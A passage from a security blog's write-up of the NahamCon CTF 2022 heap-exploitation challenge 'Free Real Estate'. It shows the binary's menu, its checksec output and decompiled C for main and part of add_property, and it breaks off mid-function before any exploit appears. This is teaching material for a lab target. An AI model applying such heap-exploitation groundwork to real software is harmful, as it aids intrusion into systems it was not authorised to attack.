<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>NahamCon CTF 2022 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="NahamCon CTF 2022" />
<meta property="og:description" content="Writeup for NahamCon CTF 2022 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/nahamcon-ctf-2022/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-05-01T08:12:50+07:00" />
<meta property="article:modified_time" content="2023-02-23T18:03:33+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png"/>

<meta name="twitter:title" content="NahamCon CTF 2022"/>
<meta name="twitter:description" content="Writeup for NahamCon CTF 2022 by Chovid99"/>
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/nahamcon-ctf-2022/" /><link rel="prev" href="https://chovid99.github.io/posts/zer0pts-ctf-2022/" /><link rel="next" href="https://chovid99.github.io/posts/angstrom-ctf-2022/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "NahamCon CTF 2022",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/nahamcon-ctf-2022\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, NahamConCTF, heap, pwn, 2022","wordcount":  5837 ,
        "url": "https:\/\/chovid99.github.io\/posts\/nahamcon-ctf-2022\/","datePublished": "2022-05-01T08:12:50+07:00","dateModified": "2023-02-23T18:03:33+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Chovid99"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">NahamCon CTF 2022</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/Chovid99" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chovid99</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="May 01, 2022">May 01, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;5837 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;28 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#free-real-estate">Free Real Estate</a>
          <ul>
            <li><a href="#intro">Intro</a></li>
            <li><a href="#initial-analysis">Initial Analysis</a>
              <ul>
                <li><a href="#main">main</a></li>
                <li><a href="#add_property">add_property</a></li>
                <li><a href="#edit_property">edit_property</a></li>
                <li><a href="#show_property">show_property</a></li>
                <li><a href="#change_username">change_username</a></li>
                <li><a href="#remove_property">remove_property</a></li>
              </ul>
            </li>
            <li><a href="#exploitation-plan">Exploitation Plan</a></li>
            <li><a href="#solution">Solution</a>
              <ul>
                <li><a href="#part-1-leak-libc-address">Part 1: Leak Libc Address</a></li>
                <li><a href="#part-2-overwrite-__free_hook">Part 2: Overwrite <code>__free_hook</code></a></li>
              </ul>
            </li>
            <li><a href="#final-script">Final script</a></li>
          </ul>
        </li>
        <li><a href="#social-media">Social Media</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/KrqEvMN.png"
        data-srcset="https://i.imgur.com/KrqEvMN.png, https://i.imgur.com/KrqEvMN.png 1.5x, https://i.imgur.com/KrqEvMN.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/KrqEvMN.png"
        title="https://i.imgur.com/KrqEvMN.png" /></p>
<p>I tried to spend my saturday to do the NahamCon CTF 2022, but I had a lot of events during the day, so I plan to look at 3-5 problems. At the end, I could only solve one problem that I looked first, because it turns out to be pretty hard for me. I&rsquo;m still new to this, so I would like to apologize in advance if there is wrong or misleading information stated in here. Feel free to contact me if you find mistakes in my writeup. Cheers üçª</p>
<h1 id="pwn">Pwn</h1>
<h2 id="free-real-estate">Free Real Estate</h2>
<h3 id="intro">Intro</h3>
<p>We were given two files, the <code>Dockerfile</code> and a binary called <code>free_real_estate</code>. Let&rsquo;s try to run the binary first.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./free_real_estate
</span></span><span class="line"><span class="cl">Enter your name: lmao
</span></span><span class="line"><span class="cl">Hello: lmao!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> Show property
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> Add property
</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> Remove property
</span></span><span class="line"><span class="cl"><span class="o">[</span>4<span class="o">]</span> Edit property
</span></span><span class="line"><span class="cl"><span class="o">[</span>5<span class="o">]</span> Change name
</span></span><span class="line"><span class="cl"><span class="o">[</span>6<span class="o">]</span> Exit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Seems like we will be working with <code>heap</code> (Well, the name of the challenge is free though)</p>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>Let&rsquo;s grab the libc file first by turning up the docker based on the given <code>Dockerfile</code>. Checking on the libc file, the glibc is <code>glibc-2.31</code>, which mean we couldn&rsquo;t do double free.</p>
<p>Checksec of the binary:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">    Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
</span></span><span class="line"><span class="cl">    Stack:    Canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, turning up our decompiler, let&rsquo;s try to decompile it and breakdown some important functions.</p>
<h4 id="main">main</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">bool</span> <span class="n">bVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">pcVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined4</span> <span class="n">uVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">size_t</span> <span class="n">sVar4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">bVar1</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter your name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">username</span><span class="p">.</span><span class="n">_8_8_</span> <span class="o">=</span> <span class="n">getline</span><span class="p">((</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">username</span><span class="p">,(</span><span class="n">size_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">username</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">pcVar2</span> <span class="o">=</span> <span class="n">username</span><span class="p">.</span><span class="n">_0_8_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">sVar4</span> <span class="o">=</span> <span class="n">strcspn</span><span class="p">(</span><span class="n">username</span><span class="p">.</span><span class="n">_0_8_</span><span class="p">,</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">pcVar2</span><span class="p">[</span><span class="n">sVar4</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">username</span><span class="p">.</span><span class="n">_8_8_</span> <span class="o">=</span> <span class="n">username</span><span class="p">.</span><span class="n">_8_8_</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Hello: %s!</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">username</span><span class="p">.</span><span class="n">_0_8_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">bVar1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar3</span> <span class="o">=</span> <span class="n">menu</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span><span class="p">(</span><span class="n">uVar3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">property</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You do not own any property.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">show_property</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">property</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">add_property</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You already own property.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">property</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You do not own any property.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">remove_property</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">property</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You do not own any property.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">edit_property</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">change_name</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">bVar1</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so we have like 5 functions that we can use, and we can only add property only after removing it.</p>
<h4 id="add_property">add_property</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">add_property</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">pvVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">size_t</span> <span class="n">sVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_21</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">_property</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">local_20</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_21</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">property</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">property</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Failed to allocate memory for the property&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the house number: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fmt_d</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;What is the length of the street name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fmt_zu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">_property</span> <span class="o">=</span> <span class="n">property</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">pvVar2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">_property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">=</span> <span class="n">pvVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Failed to allocate memory for the street name&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the street name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">fgets</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">),(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">),</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">lVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">sVar3</span> <span class="o">=</span> <span class="n">strcspn</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">),</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="n">sVar3</span> <span class="o">+</span> <span class="n">lVar1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;What is the price of the property?: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fmt_lf</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Would you like to add a comment for this property? [y/n]: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102133</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_21</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_21</span> <span class="o">==</span> <span class="sc">&#39;y&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;What is the length of the comment?: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fmt_zu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">_property</span> <span class="o">=</span> <span class="n">property</span><span class="p">;</span>
